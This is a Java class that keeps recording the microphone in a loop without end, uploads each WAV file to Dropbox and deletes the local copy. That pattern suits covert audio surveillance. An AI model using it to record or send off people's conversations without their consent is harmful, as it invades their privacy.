import com.dropbox.core.v2.DbxClientV2;

import javax.sound.sampled.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class JavaSoundRecorder
{
    private final DbxClientV2 client;
    private final AudioFileFormat.Type fileType = AudioFileFormat.Type.WAVE;
    private final AudioFormat format;
    private final DataLine.Info info;
    private TargetDataLine line;

    public JavaSoundRecorder(DbxClientV2 client)
    {
        this.client = client;
        format = getAudioFormat();
        info = new DataLine.Info(TargetDataLine.class, format);
    }

    public void recordAudio(int milliseconds)
    {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
        String date = formatter.format(new Date());
        String fileName = date + ".wav";
        String filePath = "C:\\Users\\smoke\\OneDrive\\Desktop\\" + fileName;
        File file = new File(filePath);
        start(file);
        stop(file, milliseconds);
    }

    private void start(File file)
    {
        Thread thread = new Thread()
        {
            @Override
            public void run()
            {
                try {
                    if (!AudioSystem.isLineSupported(info)) {
                        System.out.println("Line not supported");
                        System.exit(0);
                    }
                    line = (TargetDataLine) AudioSystem.getLine(info);
                    line.open(format);
                    line.start();

                    AudioInputStream ais = new AudioInputStream(line);
                    AudioSystem.write(ais, fileType, file);
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        };
        thread.start();
    }

    private void stop(File file, int milliseconds)
    {
        Thread thread = new Thread() {
            @Override
            public void run()
            {
                try {
                    sleep(milliseconds);
                    line.stop();
                    line.close();
                    recordAudio(milliseconds);
                    InputStream in = new FileInputStream(file);
                    client.files().uploadBuilder("/" + file.getName())
                            .uploadAndFinish(in);
                    in.close();
                    file.delete();
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        thread.start();
    }

    private AudioFormat getAudioFormat() {
        float sampleRate = 16000;
        int sampleSizeInBits = 8;
        int channels = 2;
        boolean signed = true;
        boolean bigEndian = true;
        AudioFormat format = new AudioFormat(
                sampleRate,
                sampleSizeInBits,
                channels,
                signed,
                bigEndian
        );
        return format;
    }
}